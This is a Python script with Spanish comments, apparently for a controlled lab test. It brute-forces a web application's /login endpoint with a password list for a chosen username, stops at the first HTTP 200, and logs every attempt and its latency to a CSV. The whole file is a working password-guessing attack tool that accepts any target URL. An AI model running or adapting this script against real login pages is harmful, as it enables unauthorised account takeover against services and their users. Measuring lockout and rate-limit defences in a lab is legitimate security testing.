#!/usr/bin/env python3
"""
attack_recorder.py
Prueba controlada de contraseñas contra /login y registra cada intento en CSV.
USO: python attack_recorder.py passwords.txt http://127.0.0.1:8000 username output.csv
"""

import sys
import csv
import time
import requests
from statistics import mean, median

if len(sys.argv) != 5:
    print("Uso: python attack_recorder.py <passwords.txt> <base_url> <username> <output.csv>")
    sys.exit(1)

pw_file = sys.argv[1]
base_url = sys.argv[2].rstrip("/")
username = sys.argv[3]
out_csv = sys.argv[4]
login_url = f"{base_url}/login"

sleep_between = 0.02  # segundos entre intentos

rows = []
attempt = 0
success = False
success_attempt = None
success_password = None
start_all = time.perf_counter()

with open(pw_file, "r", encoding="utf-8") as f:
    for raw in f:
        password = raw.strip()
        if not password:
            continue
        attempt += 1
        t0 = time.perf_counter()
        ts = time.time()  # timestamp unix
        try:
            resp = requests.post(login_url, json={"username": username, "password": password}, timeout=10)
            status = resp.status_code
        except requests.RequestException:
            status = 0
        t1 = time.perf_counter()
        latency_ms = (t1 - t0) * 1000.0
        rows.append({
            "attempt": attempt,
            "timestamp": ts,
            "password": password,
            "http_status": status,
            "latency_ms": f"{latency_ms:.2f}"
        })
        print(f"[{attempt}] {password} -> HTTP {status} ({latency_ms:.1f} ms)")
        if status == 200:
            success = True
            success_attempt = attempt
            success_password = password
            break
        time.sleep(sleep_between)

end_all = time.perf_counter()
duration_s = end_all - start_all

# Guardar CSV
with open(out_csv, "w", newline="", encoding="utf-8") as outf:
    fieldnames = ["attempt", "timestamp", "password", "http_status", "latency_ms"]
    writer = csv.DictWriter(outf, fieldnames=fieldnames)
    writer.writeheader()
    for r in rows:
        writer.writerow(r)

# Estadísticas
latencies = [float(r["latency_ms"]) for r in rows if float(r["latency_ms"]) >= 0]

def pct(p):
    lat_sorted = sorted(latencies)
    idx = int(len(lat_sorted)*p/100)
    idx = min(max(idx,0), len(lat_sorted)-1)
    return lat_sorted[idx] if lat_sorted else None

print("\n--- RESUMEN ---")
print(f"Intentos totales: {len(rows)}")
if success:
    print(f"Éxito en intento {success_attempt} con contraseña: {success_password}")
else:
    print("Contraseña no encontrada")
print(f"Tiempo total: {duration_s:.3f} s")
if latencies:
    print(f"Latencia media: {mean(latencies):.2f} ms")
    print(f"Latencia mediana: {median(latencies):.2f} ms")
    print(f"Latencia p95: {pct(95):.2f} ms")
print(f"CSV guardado en: {out_csv}")
